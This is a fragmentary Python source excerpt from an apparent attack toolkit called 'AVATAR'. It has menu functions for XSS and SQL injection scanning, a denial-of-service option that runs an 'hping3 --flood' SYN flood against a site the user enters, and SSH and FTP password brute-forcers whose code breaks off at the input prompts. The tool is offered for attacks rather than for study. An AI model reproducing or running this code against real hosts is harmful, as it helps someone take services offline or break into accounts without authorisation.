...
def XXS():
    ...
    if "id=" not in site:
        print(F + '[!]' + E + ' Site dosent have id parametrs')
    else:
...
def SQL():
    ...
    site = input(B + 'AVATAR»SqlScaner»' + E)
    if "http://" not in site and "https://" not in site:
        site = 'http://' + site
    else:
        pass
    ...
    try:
        res = urllib2.urlopen(site)
        print(W + '[+]' + G + ' Site is work' + E)
    except:
        print(F + '[!]' + E + ' Site dosent work')
    try:
        info = res.info()
        print('#####################Info#####################')
        print(info)
...
def Dos():
    ...
    AVATAR()
    print('Enter site:')
    site = input(B + 'AVATAR»Dos»' + E)
    print('''Enter level:
		1) High dos
		2) Dos port
 		3) Low dos''')
    level = int(input(B + 'AVATAR»Dos»Level»' + E))
    if level == 1:
        os.system('hping3 -S -P --flood -V ' + site)
    if level == 2:
        port = input(B + 'AVATAR»Dos»Level»Port»' + E)
...
def SSH_Brut():
    ...
    try:
        ...
        host = input(W + 'AVATAR»SSH»Host»' + E)
        print(G + 'Enter username:' + E)
        print(G + 'Default: admin' + E)
        user = input(W + 'AVATAR»SSH»User»' + E)
        if user == "":
            user = 'admin'
        print(G + 'Enter password file:' + E)
        password = input(W + 'AVATAR»SSH»Password»' + E)
...
def FTP_Brut():
    ...
    host = input(W + 'AVATAR»Ftp»Host»' + E)
    print(B + 'Enter user:' + E)
    print(F + 'Default: admin')
    user = input(W + 'AVATAR»Ftp»User»' + E)
